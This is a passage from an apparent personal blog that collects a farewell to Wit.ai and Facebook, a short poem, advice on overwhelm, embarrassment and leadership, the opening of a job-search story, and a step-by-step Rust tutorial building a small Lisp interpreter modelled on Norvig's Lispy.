chapter. One question I would ask though was this --- *are we ready?*

I'll tell you when I knew without a doubt:

Every year, the Wit team would go to our favorite restaurant, Da
Sichuan.

![](https://stopa.io/api/image/aHR0cHM6Ly9naXRodWIuY29tL3N0b3BhY2hrYS9zdG9wYWJsb2cvYmxvYi9tYXN0ZXIvaW1nLzcwNC8wKnEwVU9RdXN4emVVT1lXZ3EucG5nP3Jhdz10cnVl)

Alex carries back Da Sichuan's Ma Po Tofu sauce to France

Last year, we went as the a whole new team.

![](https://stopa.io/api/image/aHR0cHM6Ly9naXRodWIuY29tL3N0b3BhY2hrYS9zdG9wYWJsb2cvYmxvYi9tYXN0ZXIvaW1nLzcwNC8wKjBZOU11UWFVcmlOU0t5cFgucG5nP3Jhdz10cnVl)

And heck, if that's not enough, the team joined in on Georgian
traditions...

![](https://stopa.io/api/image/aHR0cHM6Ly9naXRodWIuY29tL3N0b3BhY2hrYS9zdG9wYWJsb2cvYmxvYi9tYXN0ZXIvaW1nLzcwNC8wKnVURUJ3QWJlSDdRVUpNVFYucG5nP3Jhdz10cnVl)

I saw Wit was ready, and I knew in my heart I was ready too. I came to
Wit as a kid, and I leave as an adult. I'm grateful for every moment.

In my internal post, I left a piece of advice for those at Facebook, and
I thought I'd share it externally too:

\*\* *Work and life is what you make of it. Come in with a positive
attitude, come in wanting to change the world, come in wanting to make
life long friends, come in ready to learn and grow. Do this, and watch
how reality forms around you.*\*\*

![](https://stopa.io/api/image/aHR0cHM6Ly9naXRodWIuY29tL3N0b3BhY2hrYS9zdG9wYWJsb2cvYmxvYi9tYXN0ZXIvaW1nLzcwNC8wKllTT1llTXdTeXV0WjZtY0wucG5nP3Jhdz10cnVl)

## Thank you 🙂

------------------------------------------------------------------------

*You may be wondering --- what's next? The short answer: Airbnb --- I'm
thrilled to be joining, and there's a whole story about choosing ---
will write that up in a bit.*

# Out There

Do what scares you\
Ask her that question\
Build what you dreamed of\
Sell

Risk the rejection

Face the feeling\
of your bare identity, exposed to the world

As you do this, take comfort

For this happened\
and will continue to happen\
in every place,\
in every generation,\
to man and woman,\
since human time

That feeling,\
when you feel the breeze,\
and look up,\
out of your mind, just for a moment,

sensing yourself at once bare and alone,\
but at the same time,\
connected,\
through that very feeling

# Advice for dealing with overwhelm

Someone close once shared with me, that they were feeling very
overwhelmed. This was their first job, and they were up and alone,
trying to do it all. I sent a loong messenger message of advice, and
thought I'd share it here too:

---

**First, with yourself --- when you have too much to do:**

Remember this: - There is *no* way to get more then one thing done at a
time

If you have too much to do, you can either 1) Move some things into the
future (prioritize) 2) Drop things (prioritize) 2) Reduce the
requirements (change scope) 3) Delegate

To be able to do this well, you have to remember:

You can't expect yourself to get *everything* done. You're only human,
you can only deal with one thing at a time.

**Having too much to do happens in all hard things** --- the goal here
is to solve problems *together*.

If something can't be done it is okay, and a part of life itself

**Second, with others, the key is communication**

The only thing you other people is this:

*To communicate exactly where you're at, and what the timeline looks
like*

i.e if you get a bunch of tasks

It is not your job to solve it

It is everyone's job to solve the problem *together*

So, what you need to do is it to communicate

1\) What the times for that look like, what you are prioritizing. Your
job is to state the problem, then as a team you can decide --- should we
drop some things, change the requirements, delegate, etc

**Third, if you get work you don't like**

This, is not okay for the long run. Of course we are all team players,
but one of the best things about working as a team is that everyone
should be doing what they are *amazing* at --- it is ultimately the best
for the company

So, with that, here's what we'll do:

1.  Set up a 1:1, and communicate your thoughts.
2.  The key is to remember this is again team work. If you need to be
    doing something, because that's the best for the team, it's okay.
    But then, make a plan to solve it down the road

---

**All in all, remember this:**

1\) You are doing an amazing job --- it's *impossible* to do everything,
even if you had a 100 employees. Solving every problem is not your
responsibility. Coming to a solution together is --- your only job is to
communicate

2\) It's best for you and the whole company for you to be working on
what you do best --- it's okay to take one for the team for some time,
but there needs to be a plan --- both you and the whole team will like
that.

3\) Sometimes tough communication happens during stressful situations.
It's not okay for this to be left unchecked --- everyone is human, but
there needs to be a plan, everyone needs to be on the same page. The way
to do that is to again communicate

# What to do if you're embarrassed or make a mistake

My friend recently did something a bit embarrassing. For the last few
weeks, it's been bugging them to no end. They would recurrently
remember, feel guilt, feel ashamed, give themselves remonstrations, and
the cycle would keep repeating.

We spoke about this, and I thought I'd share the advice more generally:

Whenever you make a mistake, I think two things happen:

**1)** You over-fixate on yourself, like that action you took is *all*
that matters in the world.

**2)** You start giving yourself *highly critical and mean* self talk

**For 1),** Try to get out of your head.

Do something nice for *another* person. Remember that, at the end of the
day, even with the worst possible thing for you, it's just some small
part of somebody's life. *Most things are inconsequential*

**For 2),** Imagine your self-talk turned into another person.

You see this person, and tell them an embarrassing story. They say "Oh,
that's horrible. No good person would do that --- you are a bad person.
Everyone knows now". If another person said this, wouldn't you think
they were weird and mean?

What if instead they said: "You know, I know you felt scared there. It's
okay --- most people have gone through this. It's going to be tough, but
you've got this. At the end of the day, you know you are a good person,
everything is okay, and you will do the right thing"

Now, that sounds like someone who's *truly supporting you,* and is
seeing a more holistic perspective.

Train your mind gradually, to speak to you as a *reasonable, kind
person.*

The way I do this:

Anytime I sense a cycle of negative thoughts, I open up a notebook and
write them all down. Then I start critiquing and fighting back, as if
someone else said those things. Eventually, you start internalizing it,
and the fighting back happens immediately

*Funny side note: as you do this more, some people will see you
differently, in good and bad ways. When someone hears "Oh, yeah, I lost
this much last month, made this mistake, but yeah, meant for greatness
over here, so no worries", they may think you have a bit of an ego ---
which may be true 😂*

# Risp (in (Rust) (Lisp))

Many years ago, Peter Norvig wrote a beautiful article [about creating a
lisp interpreter in Python](http://norvig.com/lispy.html). It's the most
fun tutorial I've seen, not just because it teaches you about my
favorite language family (Lisp), but because it cuts through to the
essence of interpreters, is fun to follow and quick to finish.

Recently, I had some time and wanted to learn Rust. It's a beautiful
systems language, and I've seen some great work come out from those who
adopt it. I thought, *what better way to learn Rust, than to create a
lisp interpreter in it?*

**Hence, Risp --- a lisp in rust --- was born.** In this essay you and I
will follow along with [Norvig's Lispy](http://norvig.com/lispy.html),
but instead of Python, we'll do it in Rust 🙂.

## Syntax, Semantics and Notes on Following Along

If you haven't heard of lisp, some Paul Graham's essays
([one](http://www.paulgraham.com/progbot.html),
[two](http://www.paulgraham.com/diff.html),
[three](http://www.paulgraham.com/avg.html)), alongside some [Rich
Hickey
talks](https://m.stopa.io/favorite-rich-hickey-talks-6bcb23da6ff2) will
get you fired up. In short, everything is a list, everything is an
expression, and that makes for a very powerful language.

Our structure will be similar to Norvig's tutorial, though I depart
slightly in two ways:

1.  Instead of 2 stopping points (Lispy Calculator and Full Lispy), we
    have 4 stopping points. This reflects the phases I took to build it
    in Rust.
2.  Norvig's syntax is based on Scheme. We will base it on Scheme too,
    but since I'm also a Clojure fan, I sometimes used slightly
    different naming, and different implementations for a few functions.
    I will note when I do that in the essay.

Finally, this is the first program I wrote in Rust. I may have misused
some things, so if you're a Rust hacker, I'd love to hear your feedback
🙂.

With the notes out of the way, let's get into it.

## Language 1: *Just a Risp calculator*

As Norvig suggests, our first goal is to create a subset of lisp, that
can do what a basic calculator can do.

To make it as simple as possible to follow, for language 1, **we'll
*only* support addition and subtraction.** No variable definitions, no
if statements, nada.

This departs a bit from Lispy, but I found this stopping point a lot
more convenient when writing it in Rust. So, our goal:

\[code\]

    (+ 10 5 2)//=> 17
    (- 10 5 2) //=> 3

\[/code\]

The important process we need to remember is the flow of an interpreter:

*our program* ⟶ ***parse*** ⟶ *abstract syntax tree* ⟶ ***eval*** ⟶
*result*

We will need to **parse** our program and convert it into an abstract
syntax tree. After that, we can **eval** the abstract syntax tree and
get our result. (Refer to Norvig's article for more detailed definitions
and explanations).

### Type Definitions

Risp can have three kinds of values for now:

\[code\]

    #[derive(Clone)]
    enum RispExp {
      Symbol(String),
      Number(f64),
      List(Vec<RispExp>),
    } 

\[/code\]

We'll also need an error type. We'll keep this simple, but if you're
curious there *is* a [more robust
approach](https://news.ycombinator.com/item?id=19812159).

\[code\]

    #[derive(Debug)]
    enum RispErr {
      Reason(String),
    }

\[/code\]

Finally, we'll need an *environment* type. This is where we will store
defined variables, built-in functions, and so forth:

\[code\]

    #[derive(Clone)]
    struct RispEnv {
      data: HashMap<String, RispExp>,
    }

\[/code\]

### Parsing

Our goal is to take our program, and build an abstract syntax tree from
it. For us, that is going to be a `RispExp`. To do this, first we will
take our program, and cut it up into a bunch of tokens:

\[code\]

    tokenize("(+ 10 5)") //=> ["(", "+", "10", "5", ")"]

\[/code\]

Here's how we can do that in Rust:

\[code\]

    fn tokenize(expr: String) -> Vec<String> {
      expr
        .replace("(", " ( ")
        .replace(")", " ) ")
        .split_whitespace()
        .map(|x| x.to_string())
        .collect()
    }

\[/code\]

Then, we can parse these tokens, into a `RispExp`:

\[code\]

    fn parse<'a>(tokens: &'a [String]) -> Result<(RispExp, &'a [String]), RispErr> {
      let (token, rest) = tokens.split_first()
        .ok_or(
          RispErr::Reason("could not get token".to_string())
        )?;
      match &token[..] {
        "(" => read_seq(rest),
        ")" => Err(RispErr::Reason("unexpected `)`".to_string())),
        _ => Ok((parse_atom(token), rest)),
      }
    }

\[/code\]

\*\* *Note:*\*\* *I depart slightly from Norvig's implementation, by
returning the "next" slice. This lets us recurse and parse nested lists,
without mutating the original list.*

We get the token for the current position. If it's the beginning of a
list "(", we start reading and parsing the tokens that follow, until we
hit a closing parenthesis:

\[code\]

    fn read_seq<'a>(tokens: &'a [String]) -> Result<(RispExp, &'a [String]), RispErr> {
      let mut res: Vec<RispExp> = vec![];
      let mut xs = tokens;
      loop {
        let (next_token, rest) = xs
          .split_first()
          .ok_or(RispErr::Reason("could not find closing `)`".to_string()))
          ?;
        if next_token == ")" {
          return Ok((RispExp::List(res), rest)) // skip `)`, head to the token after
        }
        let (exp, new_xs) = parse(&xs)?;
        res.push(exp);
        xs = new_xs;
      }
    }

\[/code\]

If it's a closing tag of a list ")", we return an error, as read_seq
should have skipped past it.

Otherwise, it can only be an atom, so we parse that:

\[code\]

    fn parse_atom(token: &str) -> RispExp {      
      let potential_float: Result<f64, ParseFloatError> = token.parse();
      match potential_float {
        Ok(v) => RispExp::Number(v),
        Err(_) => RispExp::Symbol(token.to_string().clone())
      }
    }

\[/code\]

### Environment

Let's go ahead and create the default, global environment. As Norvig
explains, environments are where we will store variable definitions and
built-in functions.

To implement built-in operations `(+, -)`, we need a way to save rust
function references. Let's update `RispExp`, so that we can store rust
function references:

\[code\]

    #[derive(Clone)]
    enum RispExp {
      Symbol(String),
      Number(f64),
      List(Vec<RispExp>),
      Func(fn(&[RispExp]) -> Result<RispExp, RispErr>), // bam
    }

\[/code\]

Then, we can create a `default_env` function, that returns a `RispEnv`,
which implements +, and -

\[code\]

    fn default_env() -> RispEnv {
      let mut data: HashMap<String, RispExp> = HashMap::new();
      data.insert(
        "+".to_string(), 
        RispExp::Func(
          |args: &[RispExp]| -> Result<RispExp, RispErr> {
            let sum = parse_list_of_floats(args)?.iter().fold(0.0, |sum, a| sum + a);
            
            Ok(RispExp::Number(sum))
          }
        )
      );
      data.insert(
        "-".to_string(), 
        RispExp::Func(
          |args: &[RispExp]| -> Result<RispExp, RispErr> {
            let floats = parse_list_of_floats(args)?;
            let first = *floats.first().ok_or(RispErr::Reason("expected at least one number".to_string()))?;
            let sum_of_rest = floats[1..].iter().fold(0.0, |sum, a| sum + a);
            
            Ok(RispExp::Number(first - sum_of_rest))
          }
        )
      );
      
      RispEnv {data}
    }

\[/code\]

\*\* *Note:*\*\* *I am following Clojure's spec for + and -.*

To make this simpler, I made a quick helper, which enforces that all
`RispExp` that we receive are floats:

\[code\]

    fn parse_list_of_floats(args: &[RispExp]) -> Result<Vec<f64>, RispErr> {
      args
        .iter()
        .map(|x| parse_single_float(x))
        .collect()
    }

    fn parse_single_float(exp: &RispExp) -> Result<f64, RispErr> {
      match exp {
        RispExp::Number(num) => Ok(*num),
        _ => Err(RispErr::Reason("expected a number".to_string())),
      }
    }

\[/code\]

### Evaluation

Now, time to implement **eval.**

If it's a symbol, we'll query for that symbol in the environment and
return it (for now, it should be a `RispExp::Func`)

If it's a number, we'll simply return it.

If it's a list, we'll evaluate the first form. It should be a
`RispExp::Func`. Then, we'll call that function with all the other
evaluated forms as the arguments.

\[code\]

    fn eval(exp: &RispExp, env: &mut RispEnv) -> Result<RispExp, RispErr> {
      match exp {
        RispExp::Symbol(k) =>
            env.data.get(k)
            .ok_or(
              RispErr::Reason(
                format!("unexpected symbol k='{}'", k)
              )
            )
            .map(|x| x.clone())
        ,
        RispExp::Number(_a) => Ok(exp.clone()),
        RispExp::List(list) => {
          let first_form = list
            .first()
            .ok_or(RispErr::Reason("expected a non-empty list".to_string()))?;
          let arg_forms = &list[1..];
          let first_eval = eval(first_form, env)?;
          match first_eval {
            RispExp::Func(f) => {
              let args_eval = arg_forms
                .iter()
                .map(|x| eval(x, env))
                .collect::<Result<Vec<RispExp>, RispErr>>();
              f(&args_eval?)
            },
            _ => Err(
              RispErr::Reason("first form must be a function".to_string())
            ),
          }
        },
        RispExp::Func(_) => Err(
          RispErr::Reason("unexpected form".to_string())
        ),
      }
    }

\[/code\]

**Aand, bam, we have eval.**

### Repl

Now, to make this fun and interactive, let's make a repl.

We first need a way to convert our `RispExp` to a string. Let's
implement the `Display` trait

\[code\]

    impl fmt::Display for RispExp {
      fn fmt(&self, f: &mut fmt::Formatter) -> fmt::Result {
        let str = match self {
          RispExp::Symbol(s) => s.clone(),
          RispExp::Number(n) => n.to_string(),
          RispExp::List(list) => {
            let xs: Vec<String> = list
              .iter()
              .map(|x| x.to_string())
              .collect();
            format!("({})", xs.join(","))
          },
          RispExp::Func(_) => "Function {}".to_string(),
        };
        
        write!(f, "{}", str)
      }
    }

\[/code\]

Then, let's tie the interpreter process into a loop

\[code\]

    fn parse_eval(expr: String, env: &mut RispEnv) -> Result<RispExp, RispErr> {
      let (parsed_exp, _) = parse(&tokenize(expr))?;
      let evaled_exp = eval(&parsed_exp, env)?;
      
      Ok(evaled_exp)
    }

    fn slurp_expr() -> String {
      let mut expr = String::new();
      
      io::stdin().read_line(&mut expr)
        .expect("Failed to read line");
      
      expr
    }

    fn main() {
      let env = &mut default_env();
      loop {
        println!("risp >");
        let expr = slurp_expr();
        match parse_eval(expr, env) {
          Ok(res) => println!("// 🔥 => {}", res),
          Err(e) => match e {
            RispErr::Reason(msg) => println!("// 🙀 => {}", msg),
          },
        }
      }
    }

\[/code\]

### Aand, voila, language 1.0 is done. [Here's the code so](https://gist.github.com/stopachka/22b4b06b8263687d7178f61fb22e1bf2) 🙂

We can now add and subtract!

\[code\]

    risp >
    (+ 10 5 (- 10 3 3))
    // 🔥 => 19

\[/code\]

## Language 1.1: Risp calculator++

Okay, we have a basic calculator. Now, let's add support for booleans,
and introduce some equality comparators.

To implement bools, let's include it in our `RispExp`

\[code\]

    #[derive(Clone)]
    enum RispExp {
      Bool(bool), // bam
      Symbol(String),
      Number(f64),
      List(Vec<RispExp>),
      Func(fn(&[RispExp]) -> Result<RispExp, RispErr>),
    }

\[/code\]

Rust will tell us to update `Display`

\[code\]

    impl fmt::Display for RispExp {
      fn fmt(&self, f: &mut fmt::Formatter) -> fmt::Result {
        let str = match self {
          RispExp::Bool(a) => a.to_string(),

\[/code\]

Then Rust will tell us we should change `eval`, to consider bools:

\[code\]

    fn eval(exp: &RispExp, env: &mut RispEnv) -> Result<RispExp, RispErr> {
      match exp {
        ...
        RispExp::Bool(_a) => Ok(exp.clone()),

\[/code\]

Let's also update our `parse_atom` function, to consider bools:

\[code\]

    fn parse_atom(token: &str) -> RispExp {
      match token.as_ref() {
        "true" => RispExp::Bool(true),
        "false" => RispExp::Bool(false),
        _ => {
          let potential_float: Result<f64, ParseFloatError> = token.parse();
          match potential_float {
            Ok(v) => RispExp::Number(v),
            Err(_) => RispExp::Symbol(token.to_string().clone())
          }
        }
      }
    }

\[/code\]

Now, we *should* be good to go. To really see these in action though,
let's implement `=, >, <, >=, <=`

### Comparison Operators

In clojure, these comparison operators are a bit special. They can take
more than 2 args, and return true if they are in a monotonic order that
satisfies the operator.

For example `(> 6 5 3 2)` is true, because 6 \> 5 \> 3 \> 2. Let's do
this for Risp:

\[code\]

    fn default_env() -> RispEnv {
      let mut data: HashMap<String, RispExp> = HashMap::new();
      ...
      data.insert(
        "=".to_string(), 
        RispExp::Func(ensure_tonicity!(|a, b| a == b))
      );
      data.insert(
        ">".to_string(), 
        RispExp::Func(ensure_tonicity!(|a, b| a > b))
      );
      data.insert(
        ">=".to_string(), 
        RispExp::Func(ensure_tonicity!(|a, b| a >= b))
      );
      data.insert(
        "<".to_string(), 
        RispExp::Func(ensure_tonicity!(|a, b| a < b))
      );
      data.insert(
        "<=".to_string(), 
        RispExp::Func(ensure_tonicity!(|a, b| a <= b))
      );
      
      RispEnv {data}
    }

\[/code\]

The key here is our helper macro `ensure_tonicity`. This takes a checker
function, and ensures that the conditional passes in a monotonic way.

\[code\]

    macro_rules! ensure_tonicity {
      ($check_fn:expr) => {{
        |args: &[RispExp]| -> Result<RispExp, RispErr> {
          let floats = parse_list_of_floats(args)?;
          let first = floats.first().ok_or(RispErr::Reason("expected at least one number".to_string()))?;
          let rest = &floats[1..];
          fn f (prev: &f64, xs: &[f64]) -> bool {
            match xs.first() {
              Some(x) => $check_fn(prev, x) && f(x, &xs[1..]),
              None => true,
            }
          };
          Ok(RispExp::Bool(f(first, rest)))
        }
      }};
    }

\[/code\]

### Aand, voila, language 1.1 is done. [Here's the code so](https://gist.github.com/stopachka/ddedb35ca7fc9ea5dd320c218e9054c8) 🙂

We can now use comparators, and see booleans!

\[code\]

    risp >
    (> 6 4 3 1)
    // 🔥 => true

\[/code\]

## Language 1.2: Almost Risp

Okay, now, let's make this a *language.* Let's introduce `def` and `if`.

To do this, let's update `eval` to deal with built-in operators:

\[code\]

    fn eval(exp: &RispExp, env: &mut RispEnv) -> Result<RispExp, RispErr> {
      match exp {
        ...
        RispExp::List(list) => {
          let first_form = list
            .first()
            .ok_or(RispErr::Reason("expected a non-empty list".to_string()))?;
          let arg_forms = &list[1..];
          match eval_built_in_form(first_form, arg_forms, env) {
            Some(res) => res,
            None => {
              let first_eval = eval(first_form, env)?;
              match first_eval {
                RispExp::Func(f) => {
                  let args_eval = arg_forms
                    .iter()
                    .map(|x| eval(x, env))
                    .collect::<Result<Vec<RispExp>, RispErr>>();
                  return f(&args_eval?);
                },
                _ => Err(
                  RispErr::Reason("first form must be a function".to_string())
                ),
              }
            }
          }
        },

\[/code\]

We take the first form, and try to eval it as a built-in. If we can,
voila, otherwise we evaluate as normal.

Here's how `eval_built_in_form` looks:

\[code\]

    fn eval_built_in_form(
      exp: &RispExp, arg_forms: &[RispExp], env: &mut RispEnv
    ) -> Option<Result<RispExp, RispErr>> {
      match exp {
        RispExp::Symbol(s) => 
          match s.as_ref() {
            "if" => Some(eval_if_args(arg_forms, env)),
            "def" => Some(eval_def_args(arg_forms, env)),
            _ => None,
          }
        ,
        _ => None,
      }
    }

\[/code\]

### if

Here's how we can implement if:

\[code\]

    fn eval_if_args(arg_forms: &[RispExp], env: &mut RispEnv) -> Result<RispExp, RispErr> {
      let test_form = arg_forms.first().ok_or(
        RispErr::Reason(
          "expected test form".to_string(),
        )
      )?;
      let test_eval = eval(test_form, env)?;
      match test_eval {
        RispExp::Bool(b) => {
          let form_idx = if b { 1 } else { 2 };
          let res_form = arg_forms.get(form_idx)
            .ok_or(RispErr::Reason(
              format!("expected form idx={}", form_idx)
            ))?;
          let res_eval = eval(res_form, env);
          
          res_eval
        },
        _ => Err(
          RispErr::Reason(format!("unexpected test form='{}'", test_form.to_string()))
        )
      }
    }

\[/code\]

### def

And here's def:

\[code\]

    fn eval_def_args(arg_forms: &[RispExp], env: &mut RispEnv) -> Result<RispExp, RispErr> {
      let first_form = arg_forms.first().ok_or(
        RispErr::Reason(
          "expected first form".to_string(),
        )
      )?;
      let first_str = match first_form {
        RispExp::Symbol(s) => Ok(s.clone()),
        _ => Err(RispErr::Reason(
          "expected first form to be a symbol".to_string(),
        ))
      }?;
      let second_form = arg_forms.get(1).ok_or(
        RispErr::Reason(
          "expected second form".to_string(),
        )
      )?;
      if arg_forms.len() > 2 {
        return Err(
          RispErr::Reason(
            "def can only have two forms ".to_string(),
          )
        )
      } 
      let second_eval = eval(second_form, env)?;
      env.data.insert(first_str, second_eval);
      
      Ok(first_form.clone())
    }

\[/code\]

### Aand bam, language 1.2 is done. [Here's the code so](https://gist.github.com/stopachka/b862ed8ee719d8532f5c5cdb1bd2867f) 🙂

We now have some coool built-in functions.

\[code\]

    risp >
    (def a 1)
    // 🔥 => a
    risp >
    (+ a 1)
    // 🔥 => 2
    risp >
    (if (> 2 4 6) 1 2)
    // 🔥 => 2
    risp >
    (if (< 2 4 6) 1 2)
    // 🔥 => 1

\[/code\]

## Language 2: Full Risp

Now, let's make this a full-on language. Let's implement `_lambdas_`!
Our syntax can look like this:

\[code\]

    (def add-one (fn (a) (+ 1 a)))
    (add-one 1) // => 2

\[/code\]

### First, create the lambda expression

First things first, let's introduce a Lambda type for our RispExp

\[code\]

    #[derive(Clone)]
    enum RispExp {
      Bool(bool),
      Symbol(String),
      Number(f64),
      List(Vec<RispExp>),
      Func(fn(&[RispExp]) -> Result<RispExp, RispErr>),
      Lambda(RispLambda) // bam
    }

    #[derive(Clone)]
    struct RispLambda {
      params_exp: Rc<RispExp>,
      body_exp: Rc<RispExp>,
    }

\[/code\]

Rust will tell us to update `Display` **:**

\[code\]

     impl fmt::Display for RispExp {
      fn fmt(&self, f: &mut fmt::Formatter) -> fmt::Result {
        let str = match self {
          ...
          RispExp::Lambda(_) => "Lambda {}".to_string(),

\[/code\]

Then Rust will tell us to update `eval`:

\[code\]

    fn eval(exp: &RispExp, env: &mut RispEnv) -> Result<RispExp, RispErr> {
      match exp {
        ...
        RispExp::Lambda(_) => Err(RispErr::Reason("unexpected form".to_string())),

\[/code\]

### Then, support the built-in constructor

Now, let's update **eval,** to handle fn --- this will be the built-in
call that creates a Lambda expression:

\[code\]

    fn eval_built_in_form(
      exp: &RispExp, arg_forms: &[RispExp], env: &mut RispEnv
            ...
            "fn" => Some(eval_lambda_args(arg_forms)),

\[/code\]

`eval_lambda_args` can look like this:

\[code\]

    fn eval_lambda_args(arg_forms: &[RispExp]) -> Result<RispExp, RispErr> {
      let params_exp = arg_forms.first().ok_or(
        RispErr::Reason(
          "expected args form".to_string(),
        )
      )?;
      let body_exp = arg_forms.get(1).ok_or(
        RispErr::Reason(
          "expected second form".to_string(),
        )
      )?;
      if arg_forms.len() > 2 {
        return Err(
          RispErr::Reason(
            "fn definition can only have two forms ".to_string(),
          )
        )
      }
      
      Ok(
        RispExp::Lambda(
          RispLambda {
            body_exp: Rc::new(body_exp.clone()),
            params_exp: Rc::new(params_exp.clone()),
          }
        )
      )
    }

\[/code\]

### Then, let's support scoped environments

For now we only have a global environment. To support lambdas, we need
to introduce the concept of scoped environments. Whenever we call a
lambda, we'll need to instantiate a new environment.

To do this, let's first update our `RispEnv` struct, to keep an outer
reference:

\[code\]

    #[derive(Clone)]
    struct RispEnv<'a> {
      data: HashMap<String, RispExp>,
      outer: Option<&'a RispEnv<'a>>,
    }

\[/code\]

Let's update `default_env`, to specify the lifetime and return None as
the outer environment:

\[code\]

    fn default_env<'a>() -> RispEnv<'a> {
      ... 
      RispEnv {data, outer: None}
    }

\[/code\]

Then, let's update `eval`, to recursively search for symbols in our
environment:

\[code\]

    fn env_get(k: &str, env: &RispEnv) -> Option<RispExp> {
      match env.data.get(k) {
        Some(exp) => Some(exp.clone()),
        None => {
          match &env.outer {
            Some(outer_env) => env_get(k, &outer_env),
            None => None
          }
        }
      }
    }

    fn eval(exp: &RispExp, env: &mut RispEnv) -> Result<RispExp, RispErr> {
      match exp {
        RispExp::Symbol(k) =>
          env_get(k, env)
          .ok_or(
            RispErr::Reason(
              format!("unexpected symbol k='{}'", k)
            )
          )
        ,

\[/code\]

### Finally, let's support calling lambdas

Let's update `eval`, so that we know what to do when the first form in a
list is a lambda:

\[code\]

    fn eval(exp: &RispExp, env: &mut RispEnv) -> Result<RispExp, RispErr> {
              ...
              let first_eval = eval(first_form, env)?;
              match first_eval {
                RispExp::Func(f) => {
                  f(&eval_forms(arg_forms, env)?)
                },
                RispExp::Lambda(lambda) => {
                  let new_env = &mut env_for_lambda(lambda.params_exp, arg_forms, env)?;
                  eval(&lambda.body_exp, new_env)
                },
                _ => Err(
                  RispErr::Reason("first form must be a function".to_string())
                ),
              }

\[/code\]

We first have a quick helper function to eval a list of expressions, as
we'll be doing that both for `RispExp::Func` and `RispExp::Lambda`

\[code\]

    fn eval_forms(arg_forms: &[RispExp], env: &mut RispEnv) -> Result<Vec<RispExp>, RispErr> {
      arg_forms
        .iter()
        .map(|x| eval(x, env))
        .collect()
    }

\[/code\]

Then, we create a function call `env_for_lambda`. This will get the
`params_exp`, and create an environment, where each param corresponds to
the argument at that index:

\[code\]

    fn env_for_lambda<'a>(
      params: Rc<RispExp>, 
      arg_forms: &[RispExp],
      outer_env: &'a mut RispEnv,
    ) -> Result<RispEnv<'a>, RispErr> {
      let ks = parse_list_of_symbol_strings(params)?;
      if ks.len() != arg_forms.len() {
        return Err(
          RispErr::Reason(
            format!("expected {} arguments, got {}", ks.len(), arg_forms.len())
          )
        );
      }
      let vs = eval_forms(arg_forms, outer_env)?;
      let mut data: HashMap<String, RispExp> = HashMap::new();
      for (k, v) in ks.iter().zip(vs.iter()) {
        data.insert(k.clone(), v.clone());
      }
      Ok(
        RispEnv {
          data,
          outer: Some(outer_env),
        }
      )
    }

\[/code\]

To do this, we need the helper `parse_list_of_symbol_strings`, to make
sure all of our param definitions are in fact symbols:

\[code\]

    fn parse_list_of_symbol_strings(form: Rc<RispExp>) -> Result<Vec<String>, RispErr> {
      let list = match form.as_ref() {
        RispExp::List(s) => Ok(s.clone()),
        _ => Err(RispErr::Reason(
          "expected args form to be a list".to_string(),
        ))
      }?;
      list
        .iter()
        .map(
          |x| {
            match x {
              RispExp::Symbol(s) => Ok(s.clone()),
              _ => Err(RispErr::Reason(
                "expected symbols in the argument list".to_string(),
              ))
            }   
          }
        ).collect()
    }

\[/code\]

With that, we can `eval(lambda.body_exp, new_env)`, and...

### Voila...language 2.0 is done. [Take a look at the code so](https://gist.github.com/stopachka/28b7322eecddf17766e2ee3fa3939cf6) 🙂

We now support lambdas!

\[code\]

    risp >
    (def add-one (fn (a) (+ 1 a)))
    // 🔥 => add-one
    risp >
    (add-one 1)
    // 🔥 => 2

\[/code\]

## Fin

And with that, we've reached the end of this adventure. I hope it's been
fun!

There's still a bunch more to implement, and ways we can make this even
more elegant. If you get to it, send me your thoughts 🙂.

Finally, I have to say, I loved using Rust. It's the least mental
overhead I've had to maintain with a systems language, and it was a
blast to use. The community is alive and well, plus --- [their guides
are phenomenal](https://doc.rust-lang.org/book)! Give it a shot if you
haven't already.

------------------------------------------------------------------------

If you liked this post, please share it. For more posts and thoughts,
[follow me on twitter](https://twitter.com/stopachka) 🙂.

------------------------------------------------------------------------

*Special thanks to Mark Shlick, Taryn Hill, Kaczor Donald, for reviewing
this essay.*

*Thanks to eridius for suggesting a[cleaner
implementation](https://news.ycombinator.com/item?id=19812550) of
`parse` Thanks to thenewwazoo for suggesting a [better
way](https://news.ycombinator.com/item?id=19812159) to do error handling
Thanks to phil*gk for [suggesting the use the
Display](https://www.reddit.com/r/rust/comments/bjy3y9/risp_lisp_in_rust/emeiajb/)
trait\_

# The best advice I received on leadership

I once met a mentor of mine over some hummus. He's one of the best
engineering leaders I know --- he truly takes care of his engineers and
you can feel it. That day, he gave me the best advice I've ever received
on leadership.

I was about to start in a leadership role at a new team. The
expectations were large, and I was nervous about being able to deliver
at that kind of scope, right off the bat.

So, I asked him what he would do.

He said, you only need to ask one question:

> How can I help?

Come in, with a low ego, and ask --- how can you help? How can you make
the people around you more productive? What problems are they facing and
how can you take some of them off their plate?

That's the essence of leadership. The rest is table stakes

# 10 Offers, 100 Days. The Journey

In November of 2018 I kicked off a job search that lasted 100 days. I
went through 11 onsites at companies like Google, Airbnb, Lyft, Uber,
Amazon, Square, Stripe --- you name it and I did an onsite there. Out of
the 11 I landed 10 offers, and ultimately chose Airbnb.

\*\* *In this essay I'll walk you through that journey: everything from
the spark, to the prep, the surprises, the work, the negotiation, and
the ultimate decision.*\*\*

My hope is first and foremost that you'll find the story entertaining
😊. Second, I hope this gives you an insight into how the senior
engineering job search looks like --- I found little information that
discussed what mattered the most at this stage, and I aim for this to
open up new ways of thinking for you. Third, if you want to go deeper, I
hope you check out <https://jobsearch.dev>, a free video course we made
that lays out the tactics in detail. Finally, if you're thinking about a
job search, I'll share why you should consider Airbnb and join --- it's
a phenomenal time to make a difference here.

\*\* *Without further ado...let's get into the journey!*\*\*

## The Backstory

*Note: What follows is the story behind why I chose to do a job search
in the first place. If you're looking for just the advice, skip to **The
Advice**.*

## Day -30: The Spark

November was a special month. I had just finished a 2-year-long project
at work called *The Great Migration* , and approached my 5th year at
Wit.ai, 4th at Facebook. It was my birthday that month too, and it
kicked off a lot changes: I moved houses, booked a trip and...even
bought an electric bike.

![](https://stopa.io/api/image/aHR0cHM6Ly9naXRodWIuY29tL3N0b3BhY2hrYS9zdG9wYWJsb2cvYmxvYi9tYXN0ZXIvaW1nLzcwNC8wKmNBVmotZ2xMRlBmNm9jV18ucG5nP3Jhdz10cnVl)

I swear this isn't a quarter-life crisis...

With all that change, I [reflected on my time at Wit and
Facebook](https://m.stopa.io/thank-you-wit-thank-you-facebook-8d5e7b55b777)
and saw a decision point. My team was ready, our product was mature, our
infra was stable(er), and *The Great Migration* was complete. For the
first time in a long time I had a blank slate and could earnestly ask
*--- what's next?*

## Day -1: The Decision

